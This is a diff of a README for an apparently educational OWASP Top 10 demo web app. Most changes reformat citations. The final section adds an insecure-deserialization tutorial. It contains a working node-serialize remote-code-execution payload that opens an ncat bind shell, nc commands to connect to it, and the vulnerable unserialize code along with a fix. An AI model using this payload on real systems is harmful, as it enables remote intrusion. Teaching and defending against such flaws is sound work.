@@ -102,16 +102,16 @@ These vulnerabilities will be explored through a demonstration app, datapotato:
   ---
   
 ### Citations: Injection
-  "Code injection." Wikipedia.
+  "Code injection." Wikipedia.  
   https://en.wikipedia.org/wiki/Code_injection (accessed Jan 29, 2022).
   
-  J. Williams. "Injection Theory". OWASP.
+  J. Williams. "Injection Theory". OWASP.  
   https://owasp.org/www-community/Injection_Theory (accessed Jan 29, 2022).
   
-  "Injection Attacks." IBM.
+  "Injection Attacks." IBM.  
   https://www.ibm.com/docs/en/snips/4.6.0?topic=categories-injection-attacks (accessed Jan 29, 2022).
   
-  "PREPARE Statement". MariaDB.
+  "PREPARE Statement". MariaDB.  
   https://mariadb.com/kb/en/prepare-statement/ (accessed Feb 10, 2022)
 </details>
 
@@ -175,34 +175,34 @@ These vulnerabilities will be explored through a demonstration app, datapotato:
   ---
   
 ### Citations: Broken Authentication
-  "A07:2021 – Identification and Authentication Failures". OWASP top 10:2021.
+  "A07:2021 – Identification and Authentication Failures". OWASP top 10:2021.  
   https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/ (accessed Feb 10, 2022).
   
-  "Authentication attacks". IBM.
+  "Authentication attacks". IBM.  
   https://www.ibm.com/docs/en/snips/4.6.0?topic=categories-authentication-attacks (accessed Feb 10, 2022).
   
-  D. Whitelegg. "Scan your app to find and fix OWASP Top 10 - 2017 vulnerabilities". IBM Developer.
+  D. Whitelegg. "Scan your app to find and fix OWASP Top 10 - 2017 vulnerabilities". IBM Developer.  
   https://developer.ibm.com/tutorials/se-owasp-top10/ (accessed Feb 10, 2022).
   
-  "10k-worst-passwords.txt". OWASP / passfault.
+  "10k-worst-passwords.txt". OWASP / passfault.  
   https://github.com/OWASP/passfault/blob/master/wordlists/wordlists/10k-worst-passwords.txt (accessed Feb 10, 2022).
 
-  "Authentication Cheat Sheet". OWASP Cheat Sheet Series.
+  "Authentication Cheat Sheet". OWASP Cheat Sheet Series.  
   https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html (accessed Feb 12, 2022).
   
-  "Password guidelines". Search in IBM Sterling Partner Engagement Manager.
+  "Password guidelines". Search in IBM Sterling Partner Engagement Manager.  
   https://www.ibm.com/docs/en/partnerengagemanager?topic=overview-password-guidelines (accessed Feb 12, 2022).
   
-  "zxcvbn". dropbox / zxcvbn.
+  "zxcvbn". dropbox / zxcvbn.  
   https://github.com/dropbox/zxcvbn (accessed Feb 12, 2022).
   
-  "demo". zxcvbn tests.
+  "demo". zxcvbn tests.  
   https://lowe.github.io/tryzxcvbn/ (accessed Feb 12, 2022).
   
-  "Crypto". Crypto | Node.js.
+  "Crypto". Crypto | Node.js.  
   https://nodejs.org/api/crypto.html (accessed Feb 12, 2022).
 
-  "How to use the crypto module". Node.js.
+  "How to use the crypto module". Node.js.  
   https://nodejs.org/en/knowledge/cryptography/how-to-use-crypto-module/ (accessed Feb 13, 2022).
  </details>
   
@@ -246,13 +246,13 @@ These vulnerabilities will be explored through a demonstration app, datapotato:
   
 ### Citations: Sensitive Data Exposure
   
-  "A02:2021 – Cryptographic Failures". OWASP Top 10:2021.
+  "A02:2021 – Cryptographic Failures". OWASP Top 10:2021.  
   https://owasp.org/Top10/A02_2021-Cryptographic_Failures/ (accessed Feb 13, 2022).
   
-  Avi. D. "Top 10 Common Web Attacks: The First Steps to Protect Your Website." vpnMentor.
+  Avi. D. "Top 10 Common Web Attacks: The First Steps to Protect Your Website." vpnMentor.  
   https://www.vpnmentor.com/blog/top-10-common-web-attacks/ (accessed Feb 13, 2022).
   
-  "Crypto". Crypto | Node.js.
+  "Crypto". Crypto | Node.js.  
   https://nodejs.org/api/crypto.html#class-cipher (accessed Feb 16, 2022).
   
 </details>
@@ -326,31 +326,31 @@ These vulnerabilities will be explored through a demonstration app, datapotato:
   ---
   
 ### Citations: XML External Entities
-  "XML External Entity (XXE) Processing". OWASP.
+  "XML External Entity (XXE) Processing". OWASP.  
   https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing (accessed Feb 20, 2022).
   
-  "IT06733: A vulnerability in XML External Entity (XXE) processing could allow a remote attacker to obtain sensitive information.". IBM Support.
+  "IT06733: A vulnerability in XML External Entity (XXE) processing could allow a remote attacker to obtain sensitive information.". IBM Support.  
   https://www.ibm.com/support/pages/apar/IT06733 (accessed Feb 20, 2022).
   
-  "XML introduction". MDN Web Docs.
+  "XML introduction". MDN Web Docs.  
   https://developer.mozilla.org/en-US/docs/Web/XML/XML_introduction (accessed Feb 20, 2022).
   
-  "Load external DTDs (entity/entities) (local and remote) if a pref is set". Bugzilla.
+  "Load external DTDs (entity/entities) (local and remote) if a pref is set". Bugzilla.  
   https://bugzilla.mozilla.org/show_bug.cgi?id=22942 (accessed Feb 20, 2022).
   
-  "express-xml-bodyparser". npmjs.com.
+  "express-xml-bodyparser". npmjs.com.  
   https://www.npmjs.com/package/express-xml-bodyparser (accessed Feb 20, 2022).
   
-  "Prolog and Document Type Declaration". w3.org.
+  "Prolog and Document Type Declaration". w3.org.  
   https://www.w3.org/TR/REC-xml/#sec-prolog-dtd (accessed Feb 20, 2022).
   
-  "Postman API Platform". Postman.
+  "Postman API Platform". Postman.  
   https://www.postman.com/ (accessed Feb 20, 2022).
   
-  "XML Entity Expansion in NodeJS". SecureFlag.
+  "XML Entity Expansion in NodeJS". SecureFlag.  
   https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_nodejs.html (accessed Feb 23, 2022).
   
-  "XML External Entity Prevention Cheat Sheet". OWASP Cheat Sheet Series.
+  "XML External Entity Prevention Cheat Sheet". OWASP Cheat Sheet Series.  
   https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html (accessed Feb 23, 2022).
   
 </details>
@@ -416,16 +416,16 @@ These vulnerabilities will be explored through a demonstration app, datapotato:
   ---
   
 ### Citations: Broken Access Control
-  "A01:2021 – Broken Access Control". OWASP Top 10:2021.
+  "A01:2021 – Broken Access Control". OWASP Top 10:2021.  
   https://owasp.org/Top10/A01_2021-Broken_Access_Control/ (accessed Feb 21, 2022).
   
-  "Authentication versus access control". IBM Watson Content Analytics.
+  "Authentication versus access control". IBM Watson Content Analytics.  
   https://www.ibm.com/docs/en/wca/3.0.0?topic=security-authentication-versus-access-control (accessed Feb 21, 2022).
   
-  "Access Control". Wikipedia.
+  "Access Control". Wikipedia.  
   https://en.wikipedia.org/wiki/Access_control (accessed Feb 21, 2022).
   
-  "Postman API Platform". Postman.
+  "Postman API Platform". Postman.  
   https://www.postman.com/ (accessed Feb 21, 2022).
   
 </details>
@@ -471,7 +471,7 @@ These vulnerabilities will be explored through a demonstration app, datapotato:
   
   This only exposes the TCP port 37773 to anyone on the Internet (0.0.0.0), significantly reducing the attack surface area of our system/application.
   
-  Screenshot an nmap scan before the security group was modified in AWS:
+  Screenshot of an nmap scan before the security group was modified in AWS:
   <img src="https://github.com/howed-neighbor/CS467/blob/main/public/images/aws_scan_before.png" width="100%">
   
   Screenshot of an nmap scan after the security group was modified in AWS:
@@ -582,16 +582,130 @@ These vulnerabilities will be explored through a demonstration app, datapotato:
 # 8. Insecure Deserialization
 <details>
   <summary>
-    ⨯ [Article not available yet]
+    Details
   </summary>
   
 ### Description
+  In order to understand what **Insecure Deserialization** is, we must first define **serialization.**
+  
+  Wikipedia defines **serialization** as the process of translating a data structure or object state into a format that can be stored (e.g. in a file or memory buffer) or transmitted (e.g. over a network) and reconstructed later (possibly in a different computer envrinoment). When the resulting series of bits is re-read according to the serialization format, it can be used to create a semantically identical clone of the original object.
+  
+  |Source|Definition|
+  |---|---|
+  |Search Security|**Inseucre Deserialization** is a vulnerability in which an untrusted or unknown data is used to either inflict a DoS, execute code, bypass authentication or further abuse logic behind the application. **Serialization** is the proces that converts an object to a format that can be later restored. **Deserialization** is the opposing process which takes data from a file, stream or network and rebuilds it into an object.|
+  |Portswigger|**Insecure Deserialization** is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized object in order to pass harmful data into the application code.|
+  
   ---
 ### Demonstration
+  Our web application makes use of the node package **"node-serialize"** to serialize and deserialize objects.
+  
+  In this first example, we will start off with benign input. We will serialize a simple JSON object and then deserialize it. Type:
+  
+  ```
+  {test:123}
+  ```
+  
+  and select "Submit". Here's what that looks like in our [web app (OSU VPN users only)](http://flip3.engr.oregonstate.edu:37773/insecureDeserialization):
+  
+  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/insecureDeserialization1.PNG">
+  
+  We'll now deserialize the serialized object, which should return the original input <code>{test:123}</code>. Here's the result from our web app.
+
+  > <img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/insecureDeserialization2.PNG">
+  
+  We'll now utlize a more nefarious input which will allow us to create a BIND Shell on our server. In the web app, type in the following:
+  
+  ```
+  {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}
+  ```
+  
+  In a command line terminal, preferably linux, connect to the bind shell
+  
+  If visiting the web application on our AWS instance:
+  
+  ```
+  nc -vn 157.175.92.30 4444
+  ```
+  
+  If visiting the web application on the flip server:
+  ```
+  nc -vn 127.0.0.1 4444
+  ```
+  
+  The vulnerable piece of code in our web application is:
+  
+  ```
+  var serialze = require('node-serialize')
+  var obj = req.body.userInput
+  var deserialized = serialize.unserialize(obj)
+  ```
+  
+  We are deserializing unsanitized user input.
+  
+  The issue lies in the fact that the node-serialize package allows for the serialization and deserialization of JSON objects which have functions defined.
+  
+  In nefarious payload, we created a JSON object with the key **"rce"** which had function definend as its value.
+  
+  According to [Aleski Turin](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/), a serialized object with a function defined has the following form:
+  
+  ```
+  {"anything_here":"_$$ND_FUNC$$_function (){сonsole.log(1)}"}
+  ```
+  
+  Anything after the special tag <code>$$ND_FUNC$$</code> is evaluated in the eval function.  This is what allows malicious users to execute arbitrary code on our web application.
+  
   ---
 ### Remediation
+  We can mitigate/prevent this vulnerability from being exploited by sanitizing user input.
+  
+  In our sanitized code, we make use of the <code>JSON.stringify</code> function:
+  
+  ```
+  var serialze = require('node-serialize')
+  var obj = req.body.userInput
+  var sanitized = JSON.stringify(obj)
+  var deserialized = serialize.unserialize(sanitized)
+  ```
+  
+  If we attempt to enter the malicious code again, and try to connect to the BIND shell, it will fail.
+  
+  If you enter the following code again in our sanitized form, here's what you'll see:
+  
+  ><img src="https://github.com/howed-neighbor/CS467/blob/main/public/readmeImages/insecureDeserialization3.PNG">
+  
+  Our web application can now safely deserialize the user input:
+  
+  ```
+  {test:123}
+  ```
+  
+  If you attempt to connect to the BIND shell, it no longer works. Try it:
+  
+  If visiting the web application on our AWS instance:
+  
+  ```
+  nc -vn 157.175.92.30 4444
+  ```
+  
+  If visiting the web application on the flip server:
+  
+  ```
+  nc -vn 127.0.0.1 4444
+  ```
+  
   ---
 ### Citations: Insecure Deserialization
+  "Deserialization vulnerabilities: attacking deserialization in JS" Acunetix.  
+  https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/ (accessed Feb 20, 2022).
+  
+  "Exploiting Node.js deserialization bug for Remote Code Execution". OPSECX.  
+  https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ (accessed Jan 29, 2022).
+  
+  "Serialization" Wikipedia.  
+  https://en.wikipedia.org/wiki/Serialization (accessed Feb 15, 2022).
+  
+  "What is Insecure Deserialization." Acunetix.  
+  https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/ (accessed Feb 10, 2022)
 </details>
 
 # 9. Using Components with Known Vulnerabilities
